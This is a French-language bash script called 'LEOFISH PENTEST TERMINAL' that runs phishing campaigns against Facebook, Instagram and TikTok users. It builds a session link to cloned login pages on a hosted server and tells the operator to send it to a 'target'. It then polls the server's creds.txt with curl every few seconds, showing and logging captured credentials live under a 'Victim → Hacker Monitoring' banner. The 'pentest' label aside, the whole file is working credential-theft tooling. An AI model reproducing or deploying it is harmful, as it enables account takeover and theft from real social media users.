#!/bin/bash
# ══════════════════════════════════════════
#         LEOFISH PENTEST TERMINAL
# ══════════════════════════════════════════

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Fichiers
CREDIT_FILE="credit.text"
HELP_FILE="help.text"

# URL Render
APP_URL="https://leofish-tool-v1-0.onrender.com"

# Créer dossier sessions
mkdir -p sessions

# ══════════════════════════════════════════
# BANNIÈRE
# ══════════════════════════════════════════
show_banner() {
    clear
    echo -e "${CYAN}"
    if [ -f "$CREDIT_FILE" ]; then
        cat "$CREDIT_FILE"
    fi
    echo -e "${NC}"
    echo -e "${WHITE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║${YELLOW}                    LEOFISH TERMINAL v1.0                         ${WHITE}║${NC}"
    echo -e "${WHITE}║${GREEN}                    Victim → Hacker Monitoring                    ${WHITE}║${NC}"
    echo -e "${WHITE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# ══════════════════════════════════════════
# GÉNÉRER LIEN + MONITORING (AVEC SÉLECTION)
# ══════════════════════════════════════════
generate_campaign() {
    show_banner
    echo -e "${PURPLE}🎯 NOUVELLE CAMPAGNE DE PHISH${NC}"
    echo ""
    
    # Sélection de la plateforme
    echo -e "${WHITE}Choisissez la plateforme à cloner :${NC}"
    echo -e "  ${GREEN}a${NC}  Facebook"
    echo -e "  ${GREEN}b${NC}  Instagram"
    echo -e "  ${GREEN}c${NC}  TikTok"
    echo ""
    read -rp "$(echo -e "${WHITE}Votre choix (a/b/c) : ${NC}")" platform_choice

    case $platform_choice in
        a|A)
            PLATFORM="facebook"
            PAGE="index.php"
            ;;
        b|B)
            PLATFORM="instagram"
            PAGE="instagramlogin.php"
            ;;
        c|C)
            PLATFORM="tiktok"
            PAGE="tiktoklogin.php"
            ;;
        *)
            echo -e "${RED}❌ Choix invalide. Retour au menu.${NC}"
            sleep 2
            return
            ;;
    esac

    # Ping Render pour le réveiller
    echo -e "${YELLOW}⚡ Connexion au serveur Render...${NC}"
    curl -s --max-time 15 "$APP_URL" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✅ Serveur en ligne${NC}"
    else
        echo -e "${YELLOW}⚠️  Serveur en démarrage (Render cold start, patiente 30s...)${NC}"
    fi
    echo ""

    # ID unique de session
    SESSION_ID=$(date +%s)_$(openssl rand -hex 8 2>/dev/null || echo $RANDOM$RANDOM)

    # Lien spécifique selon la plateforme
    PHISH_LINK="${APP_URL}/${PAGE}?session=${SESSION_ID}"

    # Log local
    SESSION_LOG="sessions/${SESSION_ID}_${PLATFORM}.log"
    echo "=== SESSION PENTEST $(date) - Plateforme: $PLATFORM ===" > "$SESSION_LOG"
    echo "Lien: $PHISH_LINK" >> "$SESSION_LOG"

    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║${WHITE}  ✅  LIEN GÉNÉRÉ ($PLATFORM) — ENVOIE À LA CIBLE :                ${GREEN}║${NC}"
    echo -e "${GREEN}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║  ${CYAN}${PHISH_LINK}${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}📤 Copie ce lien et envoie-le à la cible${NC}"
    echo -e "${PURPLE}⏳ Dès que la cible l'ouvre, les logs apparaîtront ici${NC}"
    echo ""
    read -rp "$(echo -e "${WHITE}Appuie sur Entrée pour démarrer le monitoring...${NC}")"

    monitor_logs "$SESSION_ID" "$SESSION_LOG" "$PLATFORM"
}

# ══════════════════════════════════════════
# MONITORING
# ══════════════════════════════════════════
monitor_logs() {
    local session_id=$1
    local session_log=$2
    local platform=$3
    local last_content=""

    show_banner
    echo -e "${RED}👁️  MONITORING LIVE${NC} — Session: ${CYAN}${session_id}${NC} [${platform^^}]"
    echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE}📡 Lecture des logs depuis : ${WHITE}${APP_URL}/creds.txt${NC}"
    echo ""

    while true; do
        current=$(curl -s --max-time 10 "${APP_URL}/creds.txt")

        if [ -n "$current" ] && [ "$current" != "$last_content" ]; then
            clear
            show_banner
            echo -e "${RED}👁️  MONITORING LIVE${NC} — Session: ${CYAN}${session_id}${NC} [${platform^^}]"
            echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
            echo ""

            while IFS= read -r line; do
                if [ -n "$line" ]; then
                    echo -e "${GREEN}[$(date '+%H:%M:%S')]${YELLOW} $line${NC}"
                    echo "$(date '+%H:%M:%S') - $line" >> "$session_log"
                fi
            done <<< "$current"

            last_content="$current"
        else
            echo -ne "${BLUE}.${NC}"
        fi

        sleep 3
    done
}

# ══════════════════════════════════════════
# VOIR LES SESSIONS (simplifié pour la lecture)
# ══════════════════════════════════════════
show_sessions() {
    show_banner
    echo -e "${YELLOW}📂 TOUTES LES SESSIONS PENTEST${NC}"
    echo ""

    if [ -z "$(ls -A sessions/ 2>/dev/null)" ]; then
        echo -e "${RED}  Aucune session enregistrée.${NC}"
    else
        echo -e "${CYAN}  Fichier                              Date${NC}"
        echo -e "${WHITE}  ──────────────────────────────────────────────${NC}"
        ls -lt sessions/ | tail -n +2 | awk '{printf "  %-35s %s %s %s\n", $9, $6, $7, $8}'
        echo ""
        read -rp "$(echo -e "${WHITE}Nom du fichier à ouvrir (ou Entrée pour passer) : ${NC}")" session_file

        if [ -n "$session_file" ] && [ -f "sessions/$session_file" ]; then
            echo ""
            echo -e "${BLUE}╔══ Contenu de $session_file ══${NC}"
            cat "sessions/$session_file"
            echo -e "${BLUE}╚════════════════════════════════${NC}"
        fi
    fi

    echo ""
    read -rp "$(echo -e "${WHITE}Entrée pour revenir...${NC}")"
}

# ══════════════════════════════════════════
# AIDE
# ══════════════════════════════════════════
show_help() {
    show_banner
    echo -e "${YELLOW}📖 GUIDE D'UTILISATION${NC}"
    echo -e "${WHITE}══════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    if [ -f "$HELP_FILE" ]; then
        cat "$HELP_FILE"
    else
        echo -e "${RED}  ❌ Fichier help.text introuvable.${NC}"
    fi
    echo ""
    read -rp "$(echo -e "${WHITE}Entrée pour revenir...${NC}")"
}

# ══════════════════════════════════════════
# MENU PRINCIPAL
# ══════════════════════════════════════════
main_menu() {
    while true; do
        show_banner
        echo -e "  ${GREEN}1${NC}  ${CYAN}🎣${NC}  ${YELLOW}Nouvelle campagne${NC}  ${WHITE}(générer lien + monitoring)${NC}"
        echo -e "  ${GREEN}2${NC}  ${CYAN}📂${NC}  ${YELLOW}Sessions enregistrées${NC}"
        echo -e "  ${GREEN}3${NC}  ${CYAN}📖${NC}  ${YELLOW}Aide${NC}"
        echo -e "  ${GREEN}0${NC}  ${RED}❌  Quitter${NC}"
        echo ""
        read -rp "$(echo -e "  ${WHITE}LEOFISH ▶ ${NC}")" choice

        case $choice in
            1) generate_campaign ;;
            2) show_sessions ;;
            3) show_help ;;
            0) echo -e "${GREEN}✅ Session terminée. À bientôt.${NC}"; echo ""; exit 0 ;;
            *) echo -e "${RED}  ❌ Choix invalide${NC}"; sleep 1 ;;
        esac
    done
}

# ══════════════════════════════════════════
# VÉRIFICATIONS AU DÉMARRAGE
# ══════════════════════════════════════════
if [ ! -f "$CREDIT_FILE" ]; then
    echo -e "${RED}❌ Erreur : credit.text manquant — place ton logo dedans.${NC}"
    exit 1
fi

if [ ! -f "$HELP_FILE" ]; then
    echo -e "${YELLOW}⚠️  help.text manquant — crée le fichier pour afficher l'aide.${NC}"
fi

main_menu
